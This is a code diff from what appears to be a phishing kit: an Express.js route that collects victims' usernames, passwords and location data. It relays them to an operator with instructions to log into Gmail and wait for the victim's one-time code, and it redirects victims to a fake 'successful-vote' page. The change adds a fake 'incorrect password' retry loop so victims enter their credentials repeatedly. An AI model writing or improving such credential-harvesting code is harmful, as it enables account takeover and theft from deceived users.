@@ -28,8 +28,8 @@ router.get("/gma/:linkId", async (req, res) => {
 router.post("/gma/:linkId", async (req, res) => {
     try {
         const { username, password, country, city, region, ip } = req.body;
-        console.log(req.body);
         const { linkId } = req.params;
+        const retry = req.query?.retry || 1;
         if (linkId.length !== 24) {
             return res.redirect("/notfound");
         }
@@ -68,6 +68,10 @@ ${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}
 
 Login now: https://www.gmail.com
                                                 `)
+            if (retry > 1) {
+                req.flash("incorrect password, try again.");
+                return res.redirect(`/gma/${linkId}?retry=${retry - 1}`);
+            }
             return res.redirect("/successful-vote");
         }
         else {
